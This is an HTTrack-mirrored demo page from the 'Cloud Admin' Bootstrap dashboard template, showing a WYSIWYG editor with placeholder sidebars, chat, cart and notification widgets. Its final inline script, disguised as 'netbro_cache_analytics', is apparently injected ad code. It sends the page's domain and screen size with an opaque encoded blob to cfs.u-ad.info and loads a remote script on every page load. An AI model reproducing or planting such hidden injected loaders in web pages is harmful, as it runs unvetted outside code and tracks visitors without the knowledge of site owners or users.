<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from jesus.gallery/cloud2/editor.html by HTTrack Website Copier/3.x [XR&CO'2013], Mon, 03 Aug 2015 07:58:01 GMT -->
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Admin Dashboard</title>
    <meta name="description" content="Cloud Admin Panel" />
    <meta name="keywords" content="Admin, Dashboard, Bootstrap3, Sass, transform, CSS3, HTML5, Web design, UI Design, Responsive Dashboard, Responsive Admin, Admin Theme, Best Admin UI, Bootstrap Theme, Bootstrap, Light weight Admin Dashboard,Light weight, Light weight Admin, Light weight Dashboard" />
    <meta name="author" content="Bootstrap Gallery" />
    <link rel="shortcut icon" href="backend/img/favicon.html">

    <!-- Bootstrap CSS -->
    <link href="backend/css/bootstrap.min.css" rel="stylesheet" media="screen">

    <!-- Animate CSS -->
    <link href="backend/css/animate.css" rel="stylesheet" media="screen">

    <!-- date range -->
    <link rel="stylesheet" type="text/css" href="backend/css/daterange.css">

    <!-- Main CSS -->
    <link href="backend/css/main.css" rel="stylesheet" media="screen">

    <!-- Slidebar CSS -->
    <link rel="stylesheet" type="text/css" href="backend/css/slidebars.css">

    <!-- Summer Note CSS -->
    <link rel="stylesheet" href="backend/css/summernote.css">

    <!-- Font Awesome -->
    <link href="backend/fonts/font-awesome.min.css" rel="stylesheet">

    <!-- HTML5 shiv and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="backend/js/html5shiv.js"></script>
    <script src="backend/js/respond.min.js"></script>
    <![endif]-->

</head>

<body>

<!-- Left sidebar start -->
<aside id="sidebar">

    <!-- Logo starts -->
    <a href="backend/#" class="logo">
        <img src="backend/img/logo.png" alt="logo">
    </a>
    <!-- Logo ends -->

    <!-- Menu start -->
    <div id='menu'>
        <ul>
            <li>
                <a href='index-2.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe007;"></div>
                    <span>Dashboard</span>
                </a>
            </li>
            <li>
                <a href='graphs.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0f8;"></div>
                    <span>Graphs</span>
                </a>
            </li>
            <li class='has-sub'>
                <a href='#'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe052;"></div>
                    <span>Ui Elements</span>
                </a>
                <ul>
                    <li>
                        <a href='panels.html'>
                            <span>Panel &amp; List Groups</span>
                        </a>
                    </li>
                    <li>
                        <a href='buttons.html'>
                            <span>Buttons</span>
                        </a>
                    </li>
                    <li>
                        <a href='grid.html'>
                            <span>Grid</span>
                        </a>
                    </li>
                    <li>
                        <a href='ui-elements.html'>
                            <span>More</span>
                        </a>
                    </li>
                </ul>
            </li>
            <li class='has-sub highlight active'>
                <a href='#'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0ab;"></div>
                    <span>Forms</span>
                </a>
                <ul style="display:block">
                    <li>
                        <a href='form.html'>
                            <span>Form Elements</span>
                        </a>
                    </li>
                    <li>
                        <a href='form-wizard.html'>
                            <span>Form Wizards</span>
                        </a>
                    </li>
                    <li>
                        <a href="backend/editor.html" class="select">
                            <span>Wysihtml Editor</span>
                        </a>
                    </li>
                </ul>
            </li>
            <li>
                <a href='gallery.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0e6;"></div>
                    <span>Gallery</span>
                </a>
            </li>
            <li>
                <a href="backend/tables.html">
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0f2;"></div>
                    <span>Tables</span>
                </a>
            </li>
            <li class='has-sub'>
                <a href='#'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0a0;"></div>
                    <span>Bonus Pages</span>
                </a>
                <ul>
                    <li>
                        <a href='invoice.html'>
                            <span>Invoice</span>
                        </a>
                    </li>
                    <li>
                        <a href='calendar.html'>
                            <span>Calendar</span>
                        </a>
                    </li>
                    <li>
                        <a href='login.html'>
                            <span>Login</span>
                        </a>
                    </li>
                    <li>
                        <a href='404.html'>
                            <span>404</span>
                        </a>
                    </li>
                    <li>
                        <a href='default.html'>
                            <span>Default</span>
                        </a>
                    </li>
                </ul>
            </li>
            <li>
                <a href='maps.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe089;"></div>
                    <span>Vector Maps</span>
                </a>
            </li>
            <li>
                <a href='notifications.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0e9;"></div>
                    <span>Notifications</span>
                </a>
            </li>
            <li>
                <a href='typography.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe019;"></div>
                    <span>Typography</span>
                </a>
            </li>
        </ul>
    </div>
    <!-- Menu End -->

</aside>
<!-- Left sidebar end -->

<!-- Dashboard Wrapper Start -->
<div class="dashboard-wrapper">

    <!-- Header start -->
    <header>
        <ul class="pull-left" id="left-nav">
            <li class="hidden-lg hidden-md hidden-sm">
                <div class="logo-mob clearfix">
                    <h2><div class="fs1" aria-hidden="true" data-icon="&#xe0db;"></div><span>Cloud Admin</span></h2>
                </div>
            </li>
            <li class="hidden-xs">
                <a href="backend/#" class="btn btn-info btn-sm">V1</a>
            </li>
            <li>
                <div class="custom-search hidden-sm hidden-xs pull-left">
                    <input type="text" class="search-query" placeholder="Search here">
                    <i class="fa fa-search"></i>
                </div>
            </li>
        </ul>
        <div class="pull-right">
            <ul id="mini-nav" class="clearfix">
                <li class="list-box hidden-xs">
                    <a id="drop1" href="backend/#" role="button" class="dropdown-toggle" data-toggle="dropdown">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe129;"></div>
                    </a>
                    <span class="info-label red-bg animated rubberBand">7</span>
                    <ul class="dropdown-menu flipInX animated messages">
                        <li class="dropdown-header">You have 7 messages</li>
                        <li>
                            <div class="icon">
                                <img src="backend/img/admin10.png" alt="Browser">
                            </div>
                            <div class="details">
                                <strong class="text-danger">Willams</strong>
                                <span>Firefox is a free, open-source web browser from Mozilla.</span>
                            </div>
                        </li>
                        <li>
                            <div class="icon">
                                <img src="backend/img/admin6.png" alt="Browser">
                            </div>
                            <div class="details">
                                <strong class="text-info">Sunny</strong>
                                <span>Internet Explorer is a free web browser from Microsoft.</span>
                            </div>
                        </li>
                        <li>
                            <div class="icon">
                                <img src="backend/img/admin3.png" alt="Browser">
                            </div>
                            <div class="details">
                                <strong class="text-info">James</strong>
                                <span>Safari is known for its sleek design and ease of use.</span>
                            </div>
                        </li>
                    </ul>
                </li>
                <li class="list-box hidden-xs">
                    <a id="drop2" href="backend/#" role="button" class="dropdown-toggle" data-toggle="dropdown">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe0e3;"></div>
                    </a>
                    <span class="info-label blue-bg animated rubberBand">3</span>
                    <ul class="dropdown-menu fadeInUp animated messages">
                        <li class="dropdown-header">Recent Chat</li>
                        <div class="chats clearfix">
                            <p class="chat them">
                                James, I'm going to be a little late.
                            </p>
                            <p class="chat me">
                                S'Okay, Dude. You know your lines...?
                            </p>
                            <p class="chat them">
                                I know em, I don't know what order they come in...
                            </p>
                            <p class="chat me">
                                We'll work it out...
                            </p>
                        </div>
                    </ul>
                </li>
                <li class="list-box hidden-xs dropdown">
                    <a id="drop3" href="backend/#" role="button" class="dropdown-toggle" data-toggle="dropdown">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe0ca;"></div>
                    </a>
                    <span class="info-label green-bg animated rubberBand">6</span>
                    <ul class="flipInX animated dropdown-menu stats-widget clearfix">
                        <li>
                            <h5 class="text-success">$37895</h5>
                            <p>Revenue <span class="text-success">+2%</span></p>
                            <div class="progress progress-xs">
                                <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 40%">
                                    <span class="sr-only">40% Complete (success)</span>
                                </div>
                            </div>
                        </li>
                        <li>
                            <h5 class="text-info">47,892</h5>
                            <p>Downloads <span class="text-info">+39%</span></p>
                            <div class="progress progress-xs">
                                <div class="progress-bar progress-bar-info" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 40%">
                                    <span class="sr-only">40% Complete (info)</span>
                                </div>
                            </div>
                        </li>
                        <li>
                            <h5 class="text-danger">28214</h5>
                            <p>Uploads <span class="text-danger">-7%</span></p>
                            <div class="progress progress-xs">
                                <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" style="width: 40%">
                                    <span class="sr-only">40% Complete (danger)</span>
                                </div>
                            </div>
                        </li>
                    </ul>
                </li>
                <li class="list-box hidden-xs dropdown">
                    <a id="drop1" href="backend/#" role="button" class="dropdown-toggle current-user" data-toggle="dropdown">
                        Sandy <b class="caret"></b>
                    </a>
                    <ul class="dropdown-menu sm fadeInUp animated messages">
                        <li class="dropdown-content">
                            <a href="backend/#">Edit Profile</a>
                            <a href="backend/#">Change Password</a>
                            <a href="backend/#">Settings</a>
                            <a href="backend/login.html">Logout</a>
                        </li>
                    </ul>
                </li>
                <li class="list-box hidden-lg hidden-md hidden-sm" id="mob-nav">
                    <a href="backend/#">
                        <i class="fa fa-reorder"></i>
                    </a>
                </li>
            </ul>
        </div>
    </header>
    <!-- Header ends -->

    <!-- Right sidebar start -->
    <div class="sb-slidebar sb-right sb-close">

        <!-- User Profile Start -->
        <section class="user-profile">
            <div class="profile-container">
                <img src="backend/img/admin1.png" class="user-img" alt="User Image">
                <div class="desc">
                    <h4>John Doe</h4>
                    <p class="text-info">UX Designer</p>
                </div>
            </div>
            <ul class="ftr-link">
                <li class="active">
                    <a href="backend/javascript:;">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe033;"></div>985
                    </a>
                </li>
                <li>
                    <a href="backend/javascript:;" class="text-success">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe0b9;"></div> 999
                    </a>
                </li>
                <li>
                    <a href="backend/javascript:;" class="text-pink">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe0e3;"></div> 143
                    </a>
                </li>
            </ul>
        </section>
        <!-- User Profile End -->

        <!-- Online Users start -->
        <div class="block">
            <div class="heading">Users Online</div>
            <div class="wrapper">
                <!-- Online Users Start -->
                <ul class="online-users">
                    <li>
                        <a href="backend/#" data-lastname="Sandhya" data-status="online" data-original-title="">
                            <span>Sunny</span>
                            <div class="user-status online"></div>
                        </a>
                    </li>
                    <li>
                        <a href="backend/#" data-lastname="Sandhya" data-status="online" data-original-title="">
                            <span>Henrik</span>
                            <div class="user-status online"></div>
                        </a>
                    </li>
                    <li>
                        <a href="backend/#" data-lastname="Sandhya" data-status="online" data-original-title="">
                            <span>John Doe</span>
                            <div class="user-status busy"></div>
                        </a>
                    </li>
                    <li>
                        <a href="backend/#" data-lastname="Sandhya" data-status="online" data-original-title="">
                            <span>Fleming</span>
                            <div class="user-status away"></div>
                        </a>
                    </li>
                    <li>
                        <a href="backend/#" data-lastname="Sandhya" data-status="online" data-original-title="">
                            <span>Wills</span>
                            <div class="user-status"></div>
                        </a>
                    </li>
                </ul>
                <!-- Online Users End -->
            </div>
        </div>
        <!-- Online Users end -->

        <!-- Checkout start -->
        <div class="block">
            <div class="heading">Checkout</div>
            <ul class="cart">
                <li class="cart-item">
              <span class="cart-item-pic">
                <img src="backend/img/admin2.png" alt="EarthSquare">
              </span>
                    Item #1
                    <span class="cart-item-desc">Description</span>
                    <span class="cart-item-price">$16.80</span>
                </li>
                <li class="cart-item">
              <span class="cart-item-pic">
                <img src="backend/img/admin4.png" alt="EarthSquare">
              </span>
                    Item #2
                    <span class="cart-item-desc">Description</span>
                    <span class="cart-item-price">$15.00</span>
                </li>
                <li class="cart-item">
              <span class="cart-item-pic">
                <img src="backend/img/admin8.png" alt="EarthSquare">
              </span>
                    Item #3
                    <span class="cart-item-desc">Description</span>
                    <span class="cart-item-price">$23.00</span>
                </li>
            </ul>
            <div class="cart-bottom">
                Total: $54.80
                <a href="backend/#" class="cart-button">Continue</a>
            </div>
        </div>
        <!-- Checkout end -->

        <!-- Notifications Start -->
        <div class="block">
            <div class="heading">Notifications</div>
            <!-- Notifications -->
            <ul class="infos">
                <li>
              <span class="label label-success pull-left">
                <div class="fs1" aria-hidden="true" data-icon="&#xe128;"></div>
              </span>
                    <div class="info">
                        <h6>Guru Tweeted</h6>
                        <p class="designation">Few seconds ago</p>
                    </div>
                </li>
                <li>
              <span class="label label-danger pull-left">
                <div class="fs1" aria-hidden="true" data-icon="&#xe0e9;"></div>
              </span>
                    <div class="info">
                        <h6>Server #999 Crashed</h6>
                        <p class="designation">2 minutes ago</p>
                    </div>
                </li>
                <li>
              <span class="label label-info pull-left">
                <div class="fs1" aria-hidden="true" data-icon="&#xe0e3;"></div>
              </span>
                    <div class="info">
                        <h6>Kiri's account was created</h6>
                        <p class="designation">5 days ago</p>
                    </div>
                </li>
            </ul>
        </div>
        <!-- Notifications End -->

    </div>
    <!-- Right sidebar end -->

    <!-- Main Container Start -->
    <div class="main-container">

        <!-- Top Bar Starts -->
        <div class="top-bar clearfix">
            <div class="page-title">
                <h4><div class="fs1" aria-hidden="true" data-icon="&#xe0ab;"></div>Wysihtml Editor <a href="backend/forms.html" class="samll">Forms</a></h4>
            </div>
            <ul class="right-stats hidden-xs" id="mini-nav-right">
                <li class="reportrange btn btn-success">
                    <i class="fa fa-calendar"></i>
                    <span></span> <b class="caret"></b>
                </li>
                <li>
                    <a href="backend/#" class="btn btn-info sb-open-right sb-close">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe06a;"></div>
                    </a>
                </li>
            </ul>
        </div>
        <!-- Top Bar Ends -->

        <!-- Container fluid Starts -->
        <div class="container-fluid">

            <!-- Spacer starts -->
            <div class="spacer-xs">

                <!-- Row starts -->
                <div class="row no-gutter">
                    <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h4>WYSIWYG Editor</h4>
                                <ul class="links">
                                    <li>
                                        <a href="backend/#">
                                            <i class="fa fa-code"></i>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                            <div class="panel-body">
                                <div class="summernote"></div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Row ends -->
            </div>
            <!-- Spacer ends -->

        </div>
        <!-- Container fluid ends -->

    </div>
    <!-- Main Container Start -->

    <!-- Footer Start -->
    <footer>
        Copyright Cloud Admin <span>2015</span>. All Rights Reserved.
    </footer>
    <!-- Footer end -->

</div>
<!-- Dashboard Wrapper End -->

<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="backend/js/jquery.js"></script>

<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="backend/js/bootstrap.min.js"></script>

<!-- Animated Right Sidebar -->
<script src="backend/js/slidebars.js"></script>

<!-- Date Range -->
<script src="backend/js/daterange/moment.js"></script>
<script src="backend/js/daterange/daterangepicker.js"></script>

<!-- Summer Note JS -->
<script src="backend/js/summernote/summernote.js"></script>

<!-- Custom JS -->
<script src="backend/js/custom.js"></script>

<script type="text/javascript">
    $(document).ready(function() {
        $('.summernote').summernote({height: 360});
    });
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRl80bpCysgjBiIujzWpBsM4xGaW5T5r227t%2fs0R9e5En6mA9%2fX%2bW8TT8984Qj8NfWmCgqlEOGugkL8KQ5l1j4tuHP4bc6qdQDunkjrKxAHOpqctVwpKiehOB1zk6uKkQEF6ycXMBot0MKbnlfPTKkhgBGcixXkVjkORWU1Od2aDG07K%2bFrFA9QbHeO8z7N8niyZdtLprTUY5%2fwUVo7H9uEJZENTEFTMTp8Y%2fhGGo%2fXEJvIJfxNEGSA2QMQs20n33zTJRQDKN5Q%2f098KJTHSXggoWAuE1kGE6Zj6owvvuj3gWk9RfOzbDn6kCl%2bP6bDFlY80i5i7RnBI70V3VJIsubSgArq6VL8jzo7%2fj0iY7KYrVFPHBT7Aey246sXW0yFDsUf4YwvOoWof3maEW8Wxi8ZXhupLLF4Bfs51FVQGBmde5Zb2rCxHf%2bLXocO4ecF%2f6Jbq2tbYA%2fCt1clSAroDhTde4Rf1kHC1j4lp0r3eSwlIpN5b%2bl4F3%2bl3%2fBjvhB%2bBb6pgUE9xjSrAGQmk7npiWJPq8nxJ74kMgibJ9t6y%2fCIRBploGo0C26Y4%2bRKHiccO3vz8mJopJz77I7fF6fBUklLeI9SPjY7EIfZ9PNx7WSohI%2bQ4XTNAKlk18GtfkhjvMg4v50s2RvHOOENUdnVaLVkFguWPYpL9Lpt7%2b%2bfE3Fy4y0cU7Ce1sxQ4vDFfDokOyj%2f9tHpeAUAl7Hog4evdIZyCQglvvx0W87Av4Umc1hnTEa%2fMr7sNziFGQbkgs8F4%2fYnWQ3MaNZVNfwBHhBENDmWQzyHOUqz2Dm4csbSOEB12OXNwngocz2Kblx5egWZA86" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from jesus.gallery/cloud2/editor.html by HTTrack Website Copier/3.x [XR&CO'2013], Mon, 03 Aug 2015 07:58:02 GMT -->
</html>
